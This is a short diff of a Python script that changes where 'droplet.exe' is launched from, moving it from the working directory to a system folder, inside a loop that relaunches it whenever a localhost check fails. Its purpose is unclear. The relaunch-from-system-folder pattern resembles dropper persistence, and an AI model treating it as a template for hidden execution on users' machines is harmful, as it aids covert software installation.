@@ -237,7 +237,7 @@ addr = ("localhost",rport)
 times = 0
 ver_cnt.settimeout(0.5)
 
-os.startfile(os.path.join(os.getcwd(),"droplet.exe"))
+os.startfile(system_folder+"droplet.exe")
 
 while True:
 	if times > 5:
@@ -253,7 +253,7 @@ while True:
 			break
 	except:
 		if not check_sender():
-			os.startfile(os.path.join(os.getcwd(),"droplet.exe"))
+			os.startfile(system_folder+"droplet.exe")
 			time.sleep(0.5)
 	times +=1
 	
